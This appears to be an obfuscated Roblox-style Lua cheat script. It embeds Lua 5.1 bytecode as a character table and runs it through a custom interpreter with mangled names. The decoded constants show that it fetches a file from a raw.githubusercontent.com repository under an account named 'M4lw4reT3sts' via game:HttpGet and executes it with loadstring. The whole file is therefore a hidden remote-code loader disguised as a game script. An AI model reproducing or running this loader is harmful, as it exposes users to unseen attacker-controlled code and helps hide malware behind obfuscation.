-- Make sure you have the table script before running this



local b={'\27','L','u','a','Q','\0','\1','\4','\8','\4','\8','\0','\7','\0','\0','\0','\0','\0','\0','\0','\60','e','v','a','l','\62','\0','\3','\0','\0','\0','\8','\0','\0','\0','\0','\0','\0','\5','\14','\0','\0','\0','\5','\0','\0','\0','E','\128','\0','\0','\9','\64','\128','\128','\5','\192','\0','\0','\28','\64','\128','\0','\5','\0','\1','\0','E','\64','\1','\0','K','\128','\193','\0','\193','\192','\1','\0','\2','\1','\128','\0','\92','\0','\0','\2','\28','\128','\0','\0','\28','\64','\128','\0','\30','\0','\128','\0','\8','\0','\0','\0','\4','\7','\0','\0','\0','\0','\0','\0','\0','s','h','a','r','e','d','\0','\4','\6','\0','\0','\0','\0','\0','\0','\0','s','o','u','n','d','\0','\4','\6','\0','\0','\0','\0','\0','\0','\0','p','r','i','n','t','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','w','a','i','t','\0','\4','\11','\0','\0','\0','\0','\0','\0','\0','l','o','a','d','s','t','r','i','n','g','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','g','a','m','e','\0','\4','\8','\0','\0','\0','\0','\0','\0','\0','H','t','t','p','G','e','t','\0','\4','O','\0','\0','\0','\0','\0','\0','\0','h','t','t','p','s','\58','\47','\47','r','a','w','\46','g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','\46','c','o','m','\47','M','\52','l','w','\52','r','e','T','\51','s','t','s','\47','s','c','r','i','p','t','s','\45','c','h','e','a','t','s','\45','\50','\47','m','a','i','n','\47','S','o','u','n','d','\46','l','u','a','\0','\0','\0','\0','\0','\14','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\8','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0'}local c={"ABC","ABx","ABC","ABC","ABC","ABx","ABC","ABx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","AsBx","ABC","ABC","ABC","ABx","ABC"}local d={"MOVE","LOADK","LOADBOOL","LOADNIL","GETUPVAL","GETGLOBAL","GETTABLE","SETGLOBAL","SETUPVAL","SETTABLE","NEWTABLE","SELF","ADD","SUB","MUL","DIV","MOD","POW","UNM","NOT","LEN","CONCAT","JMP","EQ","LT","LE","TEST","TESTSET","CALL","TAILCALL","RETURN","FORLOOP","FORPREP","TFORLOOP","SETLIST","CLOSE","CLOSURE","VARARG"}local function d(b,c,e)if e then local f=0;local g=0;for c=c,e do f=f+2^g*d(b,c)g=g+1 end;return f else local c=2^(c-1)return(b%(c+c)>=c)and 1 or 0 end end;local function e(b)local e=1;local f=false;local g;local h;local i,j;local k,l,m,n,o;do function k()local b=b:byte(e,e)e=e+1;return b end;function l()local b,c,d,f=b:byte(e,e+3)e=e+4;return f*16777216+d*65536+c*256+b end;function m()local b=l()local c=l()return c*4294967296+b end;function n()local b=l()local c=l()return(-2*d(c,32)+1)*(2^(d(c,21,31)-1023))*((d(c,1,20)*(2^32)+b)/(2^52)+1)end;function o(c)local d;if c then d=b:sub(e,e+c-1)e=e+c else c=j()if c==0 then return end;d=b:sub(e,e+c-1)e=e+c end;return d end end;local function b()local e;local f={}local g={}local h={}local j={lines={}}e={instructions=f;constants=g;prototypes=h;debug=j}local m;e.name=o()e.first_line=i()e.last_line=i()if e.name then e.name=e.name:sub(1,-2)end;e.upvalues=k()e.arguments=k()e.varg=k()e.stack=k()do m=i()for b=1,m do local e={}local g=l()local h=d(g,1,6)local c=c[h+1]e.opcode=h;e.type=c;e.A=d(g,7,14)if c=="ABC"then e.B=d(g,24,32)e.C=d(g,15,23)elseif c=="ABx"then e.Bx=d(g,15,32)elseif c=="AsBx"then e.sBx=d(g,15,32)-131071 end;f[b]=e end end;do m=i()for b=1,m do local c={}local d=k()c.type=d;if d==1 then c.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=(k()~=0)elseif d==3 then c.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=n()elseif d==4 then c.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=o():sub(1,-2)end;g[b-1]=c end end;do m=i()for c=1,m do h[c-1]=b()end end;do local b=j.lines;m=i()for c=1,m do b[c]=l()end;m=i()for b=1,m do o():sub(1,-2)l()l()end;m=i()for b=1,m do o()end end;return e end;do assert(o(4)=="\27Lua","S1MPLYS3C7RED: Bytecode expected")assert(k()==81,"S1MPLYS3C7RED: Only lua5.1 is supported")k()f=(k()==0)g=k()h=k()if g==4 then i=l elseif g==8 then i=m else error("")end;if h==4 then j=l elseif h==8 then j=m else error("")end;assert(o(3)=="\4\8\0","S1MPLYS3C7RED: Unsupported platform")end;return b()end;local function c(...)local b=select("#",...)local c={...}return b,c end;local function d(b,e)local f=b.instructions;local g=b.constants;local h=b.prototypes;local i,j;local k;local l=1;local m,n;local c={[0]=function(b)i[b.A]=i[b.B]end,[1]=function(b)i[b.A]=g[b.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI end,[2]=function(b)i[b.A]=b.B~=0;if b.C~=0 then l=l+1 end end,[3]=function(b)local c=i;for b=b.A,b.B do c[b]=nil end end,[4]=function(b)i[b.A]=e[b.B]end,[5]=function(b)local c=g[b.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;i[b.A]=k[c]end,[6]=function(b)local c=b.C;local d=i;c=c>255 and g[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[b.A]=d[b.B][c]end,[7]=function(b)local c=g[b.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;k[c]=i[b.A]end,[8]=function(b)e[b.B]=i[b.A]end,[9]=function(b)local c=b.B;local d=b.C;local e,f=i,g;c=c>255 and f[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[c]d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]e[b.A][c]=d end,[10]=function(b)i[b.A]={}end,[11]=function(b)local c=b.A;local d=b.B;local b=b.C;local e=i;d=e[d]b=b>255 and g[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[b]e[c+1]=d;e[c]=d[b]end,[12]=function(b)local c=b.B;local d=b.C;local e,f=i,g;c=c>255 and f[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[c]d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]e[b.A]=c+d end,[13]=function(b)local c=b.B;local d=b.C;local e,f=i,g;c=c>255 and f[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[c]d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]e[b.A]=c-d end,[14]=function(b)local c=b.B;local d=b.C;local e,f=i,g;c=c>255 and f[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[c]d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]e[b.A]=c*d end,[15]=function(b)local c=b.B;local d=b.C;local e,f=i,g;c=c>255 and f[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[c]d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]e[b.A]=c/d end,[16]=function(b)local c=b.B;local d=b.C;local e,f=i,g;c=c>255 and f[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[c]d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]e[b.A]=c%d end,[17]=function(b)local c=b.B;local d=b.C;local e,f=i,g;c=c>255 and f[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[c]d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]e[b.A]=c^d end,[18]=function(b)i[b.A]=-i[b.B]end,[19]=function(b)i[b.A]=not i[b.B]end,[20]=function(b)i[b.A]=#i[b.B]end,[21]=function(b)local c=b.B;local d=i[c]for b=c+1,b.C do d=d..i[b]end;i[b.A]=d end,[22]=function(b)l=l+b.sBx end,[23]=function(b)local c=b.A;local d=b.B;local b=b.C;local e,f=i,g;c=c~=0;d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]b=b>255 and f[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[b]if(d==b)~=c then l=l+1 end end,[24]=function(b)local c=b.A;local d=b.B;local b=b.C;local e,f=i,g;c=c~=0;d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]b=b>255 and f[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[b]if(d<b)~=c then l=l+1 end end,[25]=function(b)local c=b.A;local d=b.B;local b=b.C;local e,f=i,g;c=c~=0;d=d>255 and f[d-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[d]b=b>255 and f[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or e[b]if(d<=b)~=c then l=l+1 end end,[26]=function(b)if i[b.A]==(b.C~=0)then l=l+1 end end,[27]=function(b)local c=i;local d=c[b.B]if d==(b.C~=0)then l=l+1 else c[b.A]=d end end,[28]=function(b)local d=b.A;local e=b.B;local b=b.C;local f=i;local g,h;local i,k;g={}if e~=1 then if e~=0 then i=d+e-1 else i=j end;k=0;for b=d+1,i do k=k+1;g[k]=f[b]end;i,h=c(f[d](unpack(g,1,i-d)))else i,h=c(f[d]())end;j=d-1;if b~=1 then if b~=0 then i=d+b-2 else i=i+d end;k=0;for b=d,i do k=k+1;f[b]=h[k]end end end,[29]=function(b)local c=b.A;local d=b.B;local b=b.C;local b=i;local e,f;local g,h,i=j;e={}if d~=1 then if d~=0 then h=c+d-1 else h=g end;i=0;for c=c+1,h do i=i+1;e[#e+1]=b[c]end;f={b[c](unpack(e,1,h-c))}else f={b[c]()}end;return true,f end,[30]=function(b)local c=b.A;local b=b.B;local d=i;local e;local f,f;if b==1 then return true end;if b==0 then e=j else e=c+b-2 end;f={}local b=0;for c=c,e do b=b+1;f[b]=d[c]end;return true,f end,[31]=function(b)local c=b.A;local d=i;local e=d[c+2]local f=d[c]+e;d[c]=f;if e>0 then if f<=d[c+1]then l=l+b.sBx;d[c+3]=f end else if f>=d[c+1]then l=l+b.sBx;d[c+3]=f end end end,[32]=function(b)local c=b.A;local d=i;d[c]=d[c]-d[c+2]l=l+b.sBx end,[33]=function(b)local c=b.A;local d=b.B;local b=b.C;local d=i;local e=c+2;local f={d[c](d[c+1],d[c+2])}for b=1,b do d[e+b]=f[b]end;if d[c+3]~=nil then d[c+2]=d[c+3]else l=l+1 end end,[34]=function(b)local c=b.A;local d=b.B;local b=b.C;local e=i;if b==0 then error("NYI: extended SETLIST")else local b=(b-1)*50;local f=e[c]if d==0 then d=j end;for d=1,d do f[b+d]=e[c+d]end end end,[35]=function(b)io.stderr:write("NYI: CLOSE")io.stderr:flush()end,[36]=function(b)local c=h[b.Bx]local f=f;local g=i;local h={}local i=setmetatable({},{__index=function(b,b)local b=h[b]return b.segment[b.offset]end,__newindex=function(b,b,c)local b=h[b]b.segment[b.offset]=c end})for b=1,c.upvalues do local c=f[l]if c.opcode==0 then h[b-1]={segment=g,offset=c.B}elseif f[l].opcode==4 then h[b-1]={segment=e,offset=c.B}end;l=l+1 end;local c,c=d(c,i)g[b.A]=c end,[37]=function(b)local c=b.A;local b=b.B;local d,e=i,m;for b=c,c+(b>0 and b-1 or n)do d[b]=e[b-c]end end}local function d()local b=f;local d,e,f;while true do d=b[l]l=l+1;e,f=c[d.opcode](d)if e then return f end end end;local c={get_stack=function()return i end;get_IP=function()return l end}local function e(...)local c={}local e={}j=-1i=setmetatable(c,{__index=e;__newindex=function(b,b,c)if b>j and c then j=b end;e[b]=c end})local e={...}m={}n=select("#",...)-1;for b=0,n do c[b]=e[b+1]m[b]=e[b+1]end;k=getfenv()l=1;local c=coroutine.create(d)local c,d=coroutine.resume(c)if c then if d then return unpack(d)end;return else local c=b.name;local b=b.debug.lines[l]local e=d:gsub("(.-:)","")local e=""e=e..(c and c..":"or"")e=e..(b and b..":"or"")e=e..d;error(e,0)end end;return c,e end;local c={IlIIIIIIlIllIIlIlIIIllIllIIlllIllll=function(b)local b=e(b)local b,b=d(b)return b end;utils={lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll=e;IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl=d;IlllIIIllIlllIlIIIllllIIllllIIllllI=function(b)local b=e(b)return d(b)end}}c.IlIIIIIIlIllIIlIlIIIllIllIIlllIllll(table.concat(b,[[]]))()